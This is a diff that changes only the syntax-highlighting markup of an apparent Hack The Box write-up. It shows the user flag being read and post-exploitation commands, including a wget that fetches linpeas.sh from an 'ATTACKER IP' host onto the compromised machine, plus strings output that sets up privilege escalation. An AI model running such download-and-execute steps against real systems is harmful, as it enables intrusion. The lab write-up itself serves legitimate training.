@@ -245,9 +245,9 @@ theseus@10.10.10.185: Permission denied (publickey).
 
 <p>user.txt</p>
 
-<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>theseus@ubuntu:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
-<span class="nb">cat </span>user.txt
-<span class="k">*******************</span>3c1e26c2b91776
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">theseus</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">cat</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span>
+<span class="o">*******************</span><span class="mi">3</span><span class="n">c1e26c2b91776</span>
 </code></pre></div></div>
 
 <h1 id="post-exploitation--root-own">Post Exploitation &amp; Root Own</h1>
@@ -260,9 +260,9 @@ theseus@10.10.10.185: Permission denied (publickey).
 <p>in same dir that the script is located.</p>
 
 <p>from theseuse box run the following:</p>
-<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>theseus@ubuntu:~<span class="nv">$ </span>wget http://ATTACKER IP/linpeas.sh
-theseus@ubuntu:~<span class="nv">$ </span><span class="nb">chmod </span>777 linpeas.sh
-theseus@ubuntu:~<span class="nv">$ </span>./LinEnum.sh
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">theseus</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">wget</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ATTACKER</span> <span class="n">IP</span><span class="o">/</span><span class="n">linpeas</span><span class="p">.</span><span class="n">sh</span>
+<span class="n">theseus</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">chmod</span> <span class="mi">777</span> <span class="n">linpeas</span><span class="p">.</span><span class="n">sh</span>
+<span class="n">theseus</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">LinEnum</span><span class="p">.</span><span class="n">sh</span>
 </code></pre></div></div>
 
 <p>wait for the result..</p>
@@ -348,16 +348,16 @@ theseus@ubuntu:~<span class="nv">$ </span>./LinEnum.sh
 
 <p>running strings against ‘/bin/sysinfo’ and grep for above words with <code class="language-plaintext highlighter-rouge">-A1</code> option to get 1 line after each word.</p>
 
-<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>theseus@ubuntu:~<span class="nv">$ </span>strings /bin/sysinfo | <span class="nb">grep</span> <span class="s1">'Hardware\|Disk\|CPU\|MEM'</span> <span class="nt">-A1</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">theseus</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">strings</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sysinfo</span> <span class="o">|</span> <span class="n">grep</span> <span class="s">'Hardware\|Disk\|CPU\|MEM'</span> <span class="o">-</span><span class="n">A1</span>
 
-<span class="o">====================</span>Hardware <span class="nv">Info</span><span class="o">====================</span>
-lshw <span class="nt">-short</span>
-<span class="o">====================</span>Disk <span class="nv">Info</span><span class="o">====================</span>
-fdisk <span class="nt">-l</span>
-<span class="o">====================</span>CPU <span class="nv">Info</span><span class="o">====================</span>
-<span class="nb">cat</span> /proc/cpuinfo
-<span class="o">====================</span>MEM <span class="nv">Usage</span><span class="o">=====================</span>
-free <span class="nt">-h</span>
+<span class="o">====================</span><span class="n">Hardware</span> <span class="n">Info</span><span class="o">====================</span>
+<span class="n">lshw</span> <span class="o">-</span><span class="n">short</span>
+<span class="o">====================</span><span class="n">Disk</span> <span class="n">Info</span><span class="o">====================</span>
+<span class="n">fdisk</span> <span class="o">-</span><span class="n">l</span>
+<span class="o">====================</span><span class="n">CPU</span> <span class="n">Info</span><span class="o">====================</span>
+<span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">cpuinfo</span>
+<span class="o">====================</span><span class="n">MEM</span> <span class="n">Usage</span><span class="o">=====================</span>
+<span class="n">free</span> <span class="o">-</span><span class="n">h</span>
 </code></pre></div></div>
 <p>lets run each command individually..</p>
 
